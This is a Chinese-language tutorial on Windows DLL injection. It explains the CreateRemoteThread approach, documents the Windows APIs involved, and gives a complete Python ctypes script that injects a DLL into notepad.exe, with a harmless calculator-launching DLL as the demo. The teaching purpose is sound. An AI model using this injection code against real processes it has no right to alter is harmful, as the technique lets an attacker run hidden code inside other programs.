## DLL注入

DLL注入技术可以将动态链接库DLL插入特定应用程序。DLL注入共有三种方法：

第一种是使用注册表，具体做法是先在注册表特定位置输入指定DLL名称，应用程序调用user32.dll时，指定DLL就会被加载到内存；

第二种是使用前面介绍的钩取函数，即注册钩取函数，以便特定事件发生时加载指定DLL；

第三种是为运行中的应用程序创建远程线程以插入DLL。Windows系统中，CreateRemote Thread（）函数用于创建远程线程。

 

![img](img/6a7d4cc0-48bd-11eb-9189-8cc6814bc10b.png)

 

### 常用函数释义

本程序中涉及的WINDOWS API说明。更多请参考微软官方文档：

https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread

 

获得目标进程的句柄。

1. OpenProcess(权限类型，是否可被继承，进程ID)功能:返回目标进程句柄.

 

2. VirtualAllocEx(hProcess, NULL, cb, MEM_COMMIT, PAGE_READWRITE);

函数功能：为制定的进程分配虚拟地址

参数1：要分配的进程句柄

参数2：要分配的虚拟地址的位置，0表示，自动分配位置

参数3：分配的大小

参数4：MEM_COMMIT表示，分配物理内存或者页面内存，并且初始化内存为0

参数5：存储选项：PAGE_READWRITE表示可以在页面内存中 “读写”

返回值：如果分配内存成功，则返回分配内存的地址，如果分配失败则返回NULL,调用GetLastError()查看错误原因

 

3. WriteProcessMemory(hProcess, pszLibFileRemote,PVOID) pszLibFile, cb, NULL)

函数功能：在指定进程中写入内存

参数1：写入进程的句柄

参数2：写入内存的起始地址，必须是已经创建的地址，比如上面用VirtualAllocEx()在进程中创建的内存地址

参数3：写入内存中的数据内容的缓存

参数4：写入数据大小

参数5：一个选项，0表示忽视

返回值： 非0值表示成功， 返回0则表示写入错误。调用GetLastError()查看错误原因

 

4. GetProcAddress(HMODULE hModule,LPCWSTR lpProcName); 

功能：返回指定的DLL输出函数的函数地址

参数1：DLL模块句柄

参数2：DLL输出函数的函数名

这个函数的返回值，就是LoadLibrary的地址了

 

5. CreateRemoteThread()创建远程线程，既在目标进程中创建一个线程，这里的线程跟普通的线程不同，普通线程有线程处理函数ProcThread()

HANDLE CreateRemoteThread(

 HANDLE hProcess,

 LPSECURITY_ATTRIBUTES lpThreadAttributes,

 SIZE_T dwStackSize,

 LPTHREAD_START_ROUTINE lpStartAddress,

 LPVOID lpParameter,

 DWORD dwCreationFlags,

 LPDWORD lpThreadId

);

函数功能：在指定进程中的虚拟地址中创建一个线程

参数1：进程句柄，线程被创建在这个进程中

参数2：安全等级，0表示默认安全等级

参数3：创建线程的大小，0表示系统自动分配线程实际需要的大小

参数4：线程起始地址，使用LPTHREAD_START_ROUTINE 定义的线程，并且线程是在远程进程中已经存在。

参数5: 给线程函数传递的参数

参数6：创建标志，如果参数是0，则线程创建后立即运行

参数7：线程ID，如果 ID给0 ，则不返回创建线程的ID

 

 

### 代码实现

Dll注入原理：简单来说，就是通过程序A控制程序B，让程序B加载含有payload的dll，该dll在加载的过程中会执行dll中的恶意代码。从而实现注入。最常见的是通过createRemoteThread来实现注入。“CreateRemoteThread()”是最传统和最流行，以及最多文档资料介绍的DLL注入技术。

它包括以下几个步骤：

1.使用OpenProcess()函数打开目标进程

2.通过调用GetProAddress()函数找到LoadLibrary()函数的地址

3.通过调用VirtualAllocEx()函数在目标/远程进程地址空间中为DLL文件路径开辟内存空间

4.调用WriteProcessMemory()函数在之前所分配的内存空间中写入DLL文件路径

5.调用CreateRemoteThread()函数创建一个新的线程，新线程以DLL文件路径名称作为参数来调用LoadLibrary()函数

 

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/19 15:47 
# @Author   : ordar
# @File     : dll_injection.py
# @Project  : python_course
# @Python   : 3.7.5

import psutil
import sys
from ctypes import *


def dll_injection(process_name, dll_path):
    FAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = 0x001F0FFF
    VIRTUAL_MEN = (0x1000 | 0x2000)

    kernel32 = windll.kernel32

    dll_len = len(dll_path)

    # 1. 获取整个系统的进程快照
    pids = psutil.pids()
    # 2. 在快照中去比对进程名
    pid = None
    for pid in pids:
        p = psutil.Process(pid)
        if p.name() == process_name:
            break
    print('pid:', pid)
    # 3.用找到的pid去打开进程获取到句柄
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        print("[-] Couldn't acquire a handle to PID: %s" % pid)
        print("[-] Please open the notepad first")
        sys.exit()
    else:
        print("[*] PID: %s" % pid)

    # 4. 通过调用GetProAddress()函数找到LoadLibrary()函数的地址
    h_user32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_user32, "LoadLibraryA")
    # 5. 调用VirtualAllocEx()函数在目标/远程进程地址空间中为DLL文件路径开辟内存空间
    argv_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEN, FAGE_READWRITE)
    written = c_int(0)
    # 6. 调用WriteProcessMemory()函数在之前所分配的内存空间中写入DLL文件路径
    kernel32.WriteProcessMemory(h_process, argv_address, dll_path, dll_len, byref(written))

    thread_id = c_ulong(0)
    # 7. 调用CreateRemoteThread()函数创建一个新的线程，新线程以DLL文件路径名称作为参数来调用LoadLibrary()函数
    if not kernel32.CreateRemoteThread(
        h_process,
        None,
        0,
        h_loadlib,
        argv_address,
        0,
        byref(thread_id)
    ):
        print("[-] Failed to inject the DLL. Exiting.")
        sys.exit()
    else:
        # 8. dll注入只有第一次调用才会执行，从而弹出计算器，多次调用不会弹出计算器，只会打印这行信息
        # 可以关掉notepad，然后打开一个新的notepad，在执行dll注入
        print("[+] thread_ID: 0x%08x create" % thread_id.value)


if __name__ == '__main__':
    dll_injection('notepad.exe', r'D:\calc64.dll')

```



### 运行结果

运行环境：32位操作系统，如果无特殊说明，32位和64位均可

先打开记事本，然后执行dll注入，可以成功执行dll中的代码，弹出来计算器。

![img](img/762ce306-48bd-11eb-a655-8cc6814bc10b.png)

![img](img/7dad6508-48bd-11eb-989c-8cc6814bc10b.png)

 